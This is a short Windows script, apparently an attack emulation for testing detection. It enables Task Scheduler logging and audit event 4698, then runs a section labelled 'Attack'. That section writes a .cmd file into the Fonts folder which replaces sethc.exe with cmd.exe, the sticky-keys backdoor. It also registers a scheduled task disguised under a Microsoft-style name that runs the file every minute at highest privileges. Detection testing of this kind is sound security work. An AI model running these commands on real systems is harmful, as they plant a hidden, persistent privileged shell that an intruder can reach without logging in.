<# Start Task Scheduler Logs #>
$logName = 'Microsoft-Windows-TaskScheduler/Operational'
$log = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration $logName
$log.IsEnabled=$true
$log.SaveChanges()

<# Enable 4698 Events in Event Viewer #>
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable

<# Attack #>
echo "move c:\\Windows\\System32\\sethc.exe c:\\Windows\\System32\\chtes.old && del c:\\Windows\\System32\\sethc.exe && copy c:\\Windows\\System32\\cmd.exe c:\\Windows\\System32\\sethc.exe" >> c:\\Windows\\Fonts\\pepper.cmd

SCHTASKS /CREATE /SC MINUTE /TN MICROSOFT\Windows\WCM\Nettask /TR C:\Windows\Fonts\pepper.cmd /RL HIGHEST